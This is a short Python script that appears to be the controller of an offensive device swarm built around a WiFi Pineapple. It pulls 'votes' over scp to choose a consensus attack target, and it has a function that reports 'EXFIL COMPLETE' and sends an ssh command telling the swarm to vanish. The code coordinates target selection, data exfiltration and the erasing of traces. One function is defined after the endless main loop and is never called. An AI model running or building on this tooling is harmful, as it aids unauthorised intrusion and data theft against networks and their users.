import os, subprocess, time

def analyze_votes():
    print("[*] BRAIN: Analyzing collective swarm data...")
    # Pull the votes from the Pineapple
    os.system("scp root@172.16.42.1:/tmp/swarm_votes.log /tmp/current_votes.log")
    
    with open("/tmp/current_votes.log", "r") as f:
        votes = f.readlines()
    
    # Use llmswarm logic to find the 'Winner'
    # Simulation: The most mentioned target becomes the primary objective
    targets = [v.split("|")[1] for v in votes if "TARGET" in v]
    if targets:
        winner = max(set(targets), key=targets.count)
        print(f"[!] CONSENSUS REACHED: All nodes moving to target {winner}")
        return winner
    return None

if __name__ == "__main__":
    while True:
        analyze_votes()
        time.sleep(30) # Re-evaluate every 30 seconds

def check_and_vanish():
    # If our reassembled file matches the expected size/hash
    if os.path.exists("restored_data.db"):
        print("[!] EXFIL COMPLETE: Commanding Swarm to vanish.")
        # Push the 'EXIT' directive to the Pineapple bridge
        os.system("ssh root@172.16.42.1 'echo \"EXIT\" > /tmp/swarm_directive'")
        return True
    return False
